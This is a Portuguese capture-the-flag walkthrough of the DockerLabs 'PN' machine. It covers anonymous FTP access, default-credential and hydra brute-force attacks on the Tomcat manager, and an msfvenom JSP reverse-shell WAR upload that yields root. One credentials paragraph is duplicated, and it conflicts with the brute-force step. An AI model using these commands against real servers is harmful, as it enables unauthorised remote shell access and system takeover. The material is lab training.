<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>maq.pn</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>maq.pn</h1><br/><p></p><p><strong><span style="color:#ff0000;">MÁQUINA PN</span></strong></p><p></p><p><img src="images/182-1.png" alt="images/182-1.png" /></p><p></p><p><strong>Para utilizar esta máquina devemos primeiro baixar os arquivos e assim implantá-la com Docker.</strong><strong></strong></p><p><strong>  </strong><strong></strong></p><p><strong>Baixamos o arquivo da página </strong><strong><a href="https://dockerlabs.es/">https://dockerlabs.es/</a></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>Para implantar o laboratório executamos da seguinte forma, para que também possamos ver que ele nos diz a direção que teremos, bem como o que fazer quando terminarmos.</strong></p><p></p><p><img src="images/182-2.png" alt="images/182-2.png" /></p><p></p><p></p><p><strong><span style="color:#ff0000;">COLETA DE INFORMAÇÕES </span></strong></p><p></p><p><strong><span style="color:#ff7800;">nmap 172.17.0.2 -A -sS -sV -sC -Pn -T5 -p-</span></strong></p><p></p><p><img src="images/182-3.png" alt="images/182-3.png" /></p><p></p><p><strong>Primeiro entramos no serviço </strong><strong><span style="color:#ff7800;">FTP</span></strong><strong>, pois você pode usar o acesso </strong><strong><span style="color:#ff7800;">Anonymous</span></strong><strong>. E podemos ver que temos um arquivo chamado </strong><strong><span style="color:#ff7800;">tomcat.txt</span></strong><strong> e copiar o arquivo em nossa máquina usando </strong><strong><span style="color:#ff7800;">get</span></strong><strong>.</strong></p><p></p><p><img src="images/182-4.png" alt="images/182-4.png" /></p><p></p><p><strong>Tradução da mensagem para português:</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>Olá tomcat, você consegue configurar o servidor tomcat? Perdi a senha...</strong></p><p></p><p><img src="images/182-5.png" alt="images/182-5.png" /></p><p></p><p><strong>Entramos no endereço da web com a porta 8080 e podemos ver a página inicial do apache </strong><strong><span style="color:#ff7800;">Tomcat</span></strong><strong>, que aparentemente é a </strong><strong><span style="color:#ff7800;">versão 9.0.88</span></strong><strong>.</strong></p><p></p><p><img src="images/182-6.png" alt="images/182-6.png" /></p><p></p><p><strong>Vamos clicar em </strong><strong><span style="color:#ff7800;">Manager app</span></strong><strong>.</strong></p><p></p><p><strong>Para poder acessar em Tomcat, devemos clicar  </strong><strong><code>managerwebapp</code></strong><strong>E nós vamos ter o próximo  </strong><strong><code>popup</code></strong><strong> pedindo-nos para inserir as credenciais na próxima página, encontre uma lista de credenciais padrão </strong><strong><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat</a></strong><strong> que tentamos cada um deles e aquele que nos permite entrar é </strong><strong><code>s3cr3t</code></strong><strong>:</strong></p><p></p><p><img src="images/182-7.png" alt="images/182-7.png" /></p><p></p><p><strong>Outra opção também é cancelar e nos mostrar as credenciais, embora nem sempre funcione como neste caso, nos mostra  </strong><strong><code>s3cret</code></strong><strong>E essa não é a senha.</strong></p><p></p><p><img src="images/182-8.png" alt="images/182-8.png" /></p><p></p><p><strong>Para poder acessar em Tomcat, devemos clicar  </strong><strong><code>managerwebapp</code></strong><strong>E nós vamos ter o próximo  </strong><strong><code>popup</code></strong><strong>pedindo-nos para inserir as credenciais na próxima página, encontre uma lista de credenciais padrão </strong><strong><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat</a></strong><strong> que tentamos cada um deles e aquele que nos permite entrar é </strong><strong><code>s3cr3t</code></strong><strong>:</strong></p><p></p><p><img src="images/182-9.png" alt="images/182-9.png" /></p><p></p><p><strong>Vamos fazer um brute force com </strong><strong><span style="color:#ff7800;">hydra</span></strong><strong>.</strong></p><p></p><p><strong>hydra -L users.txt -P senhas.txt -f 172.17.0.2 -s 8080 http-get  /manager/html</strong></p><p></p><p><img src="images/182-10.png" alt="images/182-10.png" /></p><p></p><p><strong>Vamos fazer o login:</strong><strong></strong></p><p><strong></strong></p><p><img src="images/182-11.png" alt="images/182-11.png" /></p><p></p><p><img src="images/182-12.png" alt="images/182-12.png" /></p><p></p><p><strong>Uma vez dentro, podemos ver que temos a opção de carregar arquivos de </strong><strong><span style="color:#ff7800;">war</span></strong><strong> e, através disso, podemos nos conectar. O comando seria:</strong></p><p></p><p><strong><span style="color:#ff7800;">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.5 LPORT=1234 -f war &gt; shell.war</span></strong></p><p></p><p><img src="images/182-13.png" alt="images/182-13.png" /></p><p></p><p><strong>Vamos fazer o upload do arquivo, o nome que coloquei foi </strong><strong><span style="color:#ff7800;">shell10.war</span></strong><strong>.</strong></p><p></p><p><img src="images/182-14.png" alt="images/182-14.png" /></p><p></p><p><strong>Agora vamos deixar o </strong><strong><span style="color:#ff7800;">netcat</span></strong><strong> na escuta.</strong></p><p></p><p><img src="images/182-15.png" alt="images/182-15.png" /></p><p></p><p><strong>Assim que clicar em cima do arquivo </strong><strong><span style="color:#ff7800;">shell10.war,</span></strong><strong> vamos ser usuário </strong><strong><span style="color:#ff7800;">root</span></strong><strong>.</strong></p><p></p><p><img src="images/182-16.png" alt="images/182-16.png" /></p><p></p><p><img src="images/182-17.png" alt="images/182-17.png" /></p><p></p><p><strong><span style="color:#ff7800;">somos root</span></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><strong><span style="color:#ff0000;text-decoration:line-through;">R10</span></strong></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
